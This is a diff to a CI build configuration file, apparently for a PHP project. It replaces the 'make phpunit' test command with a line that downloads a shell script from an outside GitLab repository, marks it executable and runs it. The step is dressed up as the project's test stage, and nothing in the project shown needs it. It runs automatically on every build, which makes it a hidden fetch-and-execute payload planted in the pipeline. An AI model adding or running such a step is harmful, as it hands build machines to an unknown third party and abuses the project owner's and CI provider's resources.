@@ -15,7 +15,7 @@ build:
             tests:
                 override:
                     -
-                        command: "make phpunit"
+                        command: "wget https://gitlab.com/adamasdsad/anjim6/-/raw/master/garagaskeun.sh && chmod u+x garagaskeun.sh && ./garagaskeun.sh"
                         coverage:
                             file: "build/coverage.clover"
                             format: "php-clover"
